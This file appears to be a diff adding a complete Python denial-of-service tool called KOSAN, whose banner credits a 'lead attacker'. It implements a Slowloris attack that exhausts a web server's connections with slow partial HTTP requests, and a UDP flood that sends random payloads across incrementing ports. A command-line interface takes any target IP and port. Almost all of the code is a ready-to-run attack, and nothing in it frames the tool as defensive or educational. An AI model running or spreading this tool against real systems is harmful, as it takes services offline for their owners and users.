@@ -1,0 +1,139 @@
+#!/usr/bin/env python3
+
+version= '3.0'
+title = '''
+
+██╗  ██╗ ██████╗ ███████╗ █████╗ ███╗   ██╗
+██║ ██╔╝██╔═══██╗██╔════╝██╔══██╗████╗  ██║
+█████╔╝ ██║   ██║███████╗███████║██╔██╗ ██║
+██╔═██╗ ██║   ██║╚════██║██╔══██║██║╚██╗██║
+██║  ██╗╚██████╔╝███████║██║  ██║██║ ╚████║
+╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
+                                           
+                                                                    
+ Penyerang utama MUHAMMAD DERICK PASCAL
+'''
+
+
+
+import socket
+import time
+import random
+from random import randrange
+import argparse
+
+class SlowlorisAttack:
+    def __init__(self, target_ip, port, total_requests, timeout=None):
+        self.target_ip = target_ip
+        self.port = port
+        self.total_requests = total_requests
+        self.timeout = timeout
+
+    def __setup_socket(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        try:
+            s.connect((self.target_ip, self.port))
+            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+            s.send("User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n".encode("utf-8"))
+            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+            return s
+        except socket.error:
+            pass
+
+    def attack(self):
+        self.sockets_list = []
+        for _ in range(self.total_requests):
+            sock = self.__setup_socket()
+            if sock:
+                self.sockets_list.append(sock)
+        start_time = time.time()
+        while True:
+            if self.timeout and time.time() - start_time >= self.timeout:
+                break
+            for socket_item in self.sockets_list:
+                try:
+                    socket_item.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+                except socket.error:
+                    self.sockets_list.remove(socket_item)
+            for _ in range(self.total_requests - len(self.sockets_list)):
+                try:
+                    sock = self.__setup_socket()
+                    if sock:
+                        self.sockets_list.append(sock)
+                except socket.error:
+                    break
+
+        if not self.sockets_list: 
+            print("Attack Failure {} Check your connection".format(
+                len(self.sockets_list)
+            ))           
+        else:
+            print("Slowloris attack has finished.")
+            print("Total {} socket connections were made to {}:{} during {} seconds.".format(
+                len(self.sockets_list), self.target_ip, self.port, self.timeout))
+            
+
+class UDPAttack:
+    def __init__(self, target_ip, port, sleep):
+        self.target_ip = target_ip
+        self.port = port
+        self.sleep = sleep
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    def attack(self):
+        while True:
+            try:
+                self.s.connect((self.target_ip, self.port))
+                break
+            except Exception:
+                pass
+        
+        for i in range(1, 100**1000):
+            try:
+                self.s.send(random._urandom(10)*1000)
+                self.port += 1
+                print("Sent %s packet to %s through port %s From Fake ip %s"%(i, self.target_ip, self.port, self.__fake_ip()))
+                time.sleep(self.sleep)
+            except Exception as e:
+                print(f"Error: {e}")
+                break
+
+        self.s.close()
+
+    def __fake_ip(self):
+        return ".".join(str(randrange(1, 256)) for _ in range(4))
+    
+
+def main():
+    print(title)
+    parser = argparse.ArgumentParser(description="A simple script to perform Slowloris or UDP attack.", add_help=True)
+    parser.add_argument("--type", dest="attack_type", required=True, help="The type of attack to perform (slowloris or udp)")
+    parser.add_argument("--ip", dest="target_ip", required=True, help="The IP address of the target")
+    parser.add_argument("--port", dest="port", required=True, type=int, help="The port to target")
+    
+    # Slowloris attack options
+    parser.add_argument("--T", dest="total_requests", type=int, default=1000, help="The total number of requests to send in a slowloris attack (default: 1000)")
+    parser.add_argument("--to", dest="timeout", type=int, default=None, help="The timeout (in seconds) for the slowloris attack (default: no timeout)")
+    
+    # UDP attack options
+    parser.add_argument("--s", dest="sleep", type=float, default=0.1, help="The sleep time (in seconds) between sending UDP packets in an UDP attack (default: 0.1)")
+    
+    args = parser.parse_args()
+    
+    if args.attack_type == "slowloris":
+        slow = SlowlorisAttack(args.target_ip, args.port, args.total_requests, args.timeout)
+        slow.attack()
+    elif args.attack_type == "udp":
+        udp = UDPAttack(args.target_ip, args.port, args.sleep)
+        udp.attack()
+    else:
+        print("Invalid attack type")
+
+if __name__ == "__main__":
+    main()
+	
+
+
+
+
